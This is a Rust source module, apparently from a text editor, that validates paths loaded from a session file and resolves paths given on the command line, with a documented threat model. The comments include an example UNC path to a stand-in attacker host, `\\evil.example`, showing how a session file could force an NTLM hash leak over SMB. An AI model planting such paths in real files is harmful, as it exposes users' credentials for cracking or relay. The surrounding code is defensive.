//! The trust boundary around paths that came out of a session file.
//!
//! `AGENTS.md` requires our own config and session files be treated as untrusted input, and names
//! the precedent: Notepad++ shipped three consecutive path-traversal bypasses in 2026 by patching
//! symptoms instead of the boundary.
//!
//! # The threat, concretely
//!
//! This editor never launches a process, so the Notepad++ failure mode — a config string reaching a
//! command line — does not exist here. The realistic attack on Windows is different and worse than
//! traversal:
//!
//! **A session file naming a UNC path causes an outbound SMB connection the moment the tab is
//! opened**, and Windows will attempt NTLM authentication to that host automatically. That leaks a
//! hash for offline cracking or relay, with no dialog and nothing on screen. `\\evil.example\a\x.md`
//! is all it takes. The device namespace (`\\.\pipe\…`) is the same shape of problem: reads that
//! block, or touch a device rather than a file.
//!
//! So the rule is **anything beginning with `\\` is refused**, along with relative paths, `..`
//! components, and anything that is not an existing regular file.
//!
//! # What is deliberately not defended
//!
//! A symlink that resolves to a device. Defending it means either rejecting all symlinks, which is
//! user-hostile, or racing the filesystem between check and open. It is also a much weaker position
//! for an attacker: writing the session file already requires write access to the user's local app
//! data, and anyone holding that can do considerably worse than make us read a pipe.

//! # A command line is a different source, and gets a different rule
//!
//! Everything above is about a file this process wrote and something else may have edited. A path
//! typed at a shell, or handed over by Explorer, is the user themselves — the party the rules above
//! exist to protect. None of those rules defends against anything there, and all three reject
//! ordinary input: a relative path is how anyone invokes a CLI, `..` is a component a shell hands
//! over without comment, and a UNC path the user typed is one they meant.
//!
//! So [`from_command_line`] resolves against the working directory and checks only that the result
//! is a file. That is not a weakening of [`validate`] — it is a second function for a second source,
//! and the two sit here together so the difference is written down rather than inferred.

use std::path::{Component, Path, PathBuf};

/// Why a path from a session file was refused.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum PathRejected {
    /// Not an absolute path.
    ///
    /// A relative path in a session file would resolve against whatever directory the editor
    /// happened to be launched from, which is not a thing to guess about.
    #[error("{0} is not absolute")]
    NotAbsolute(PathBuf),

    /// A UNC or device path.
    #[error("{0} is a network or device path, which this editor will not open from a session file")]
    NetworkOrDevice(PathBuf),

    /// Contains a `..` component.
    #[error("{0} contains a parent-directory component")]
    Traversal(PathBuf),

    /// Does not exist, or is not a regular file.
    #[error("{0} is not an existing file")]
    NotAFile(PathBuf),
}

impl PathRejected {
    /// The path that was refused.
    #[must_use]
    pub fn path(&self) -> &Path {
        match self {
            Self::NotAbsolute(p)
            | Self::NetworkOrDevice(p)
            | Self::Traversal(p)
            | Self::NotAFile(p) => p,
        }
    }
}

/// Checks a path that came from a session file, before anything opens it.
///
/// Ordered cheapest first, and the filesystem is touched last: a malformed session file should be
/// rejected on its shape without a syscall per entry.
///
/// # Errors
///
/// [`PathRejected`], naming which rule the path broke.
pub fn validate(path: &Path) -> Result<(), PathRejected> {
    // Checked on the *given* string rather than after canonicalisation: `fs::canonicalize` returns
    // `\\?\C:\…` on Windows, which would make every legitimate path look like a device path.
    if starts_with_double_separator(path) {
        return Err(PathRejected::NetworkOrDevice(path.to_path_buf()));
    }

    if !path.is_absolute() {
        return Err(PathRejected::NotAbsolute(path.to_path_buf()));
    }

    if path
        .components()
        .any(|component| component == Component::ParentDir)
    {
        return Err(PathRejected::Traversal(path.to_path_buf()));
    }

    // Last, because it is the only rule that costs a syscall. `metadata` follows symlinks, which is
    // wanted: a link to a real file is a real file.
    match std::fs::metadata(path) {
        Ok(metadata) if metadata.is_file() => Ok(()),
        _ => Err(PathRejected::NotAFile(path.to_path_buf())),
    }
}

/// Resolves a path given on the command line, or by the shell.
///
/// The result is absolute, because everything downstream needs it to be: a tab is keyed by its path,
/// and a relative one written into the session file would be refused by [`validate`] on the next
/// start, having meanwhile meant whatever directory the editor happened to be launched from.
///
/// The result must also be something [`validate`] would accept, because that is what it will be
/// handed on the next start — which means no `..` left in it. **The two platforms remove those
/// differently, and neither way works on the other:**
///
/// - On Windows, [`std::path::absolute`] applies Win32 path normalisation, which flattens `..`
///   lexically because that is what the platform itself defines a path to mean. Canonicalising
///   instead would return `\\?\C:\…`, which `validate`'s *first* check reads as the device
///   namespace — so the tab would be refused on the next start. The way not to spring the trap
///   `validate` documents is not to create such a path.
/// - On Unix, `absolute` deliberately leaves `..` alone, because `a/link/..` is not `a` when `link`
///   is a symlink; removing it lexically would silently name a different file. So the resolution has
///   to touch the filesystem, and [`std::fs::canonicalize`] is the platform's answer. There is no
///   verbatim-prefix problem to trade against.
///
/// The asymmetry is real rather than tidied away: on Unix a symlink resolves to its target, and on
/// Windows it does not. Both are the platform's own rule, and both give something `validate` takes.
///
/// # Errors
///
/// [`PathRejected::NotAFile`] if it does not resolve, does not exist, or is not a regular file. A
/// typo should say so rather than opening an empty buffer named after it — that would be a feature,
/// and this is the behaviour the editor already had.
pub fn from_command_line(path: &Path) -> Result<PathBuf, PathRejected> {
    // Reported as given rather than as resolved throughout, because what the user typed is where
    // they will look for the typo.
    let rejected = || PathRejected::NotAFile(path.to_path_buf());

    #[cfg(windows)]
    // Only an empty path, or one the platform cannot express, fails here.
    let resolved = std::path::absolute(path).map_err(|_| rejected())?;

    #[cfg(not(windows))]
    // Fails when any component does not exist, which is the same answer the metadata check below
    // would give and is reported the same way.
    let resolved = std::fs::canonicalize(path).map_err(|_| rejected())?;

    match std::fs::metadata(&resolved) {
        Ok(metadata) if metadata.is_file() => Ok(resolved),
        _ => Err(rejected()),
    }
}

/// Whether the path begins with two separators, which on Windows means UNC or the device namespace.
///
/// Done on the raw string. `Path::components` normalises the prefix away on Windows and reports
/// nothing distinguishable on other platforms, so both would miss it.
fn starts_with_double_separator(path: &Path) -> bool {
    let text = path.as_os_str().to_string_lossy();
    let mut characters = text.chars();
    matches!(
        (characters.next(), characters.next()),
        (Some('\\'), Some('\\')) | (Some('/'), Some('/'))
    )
}
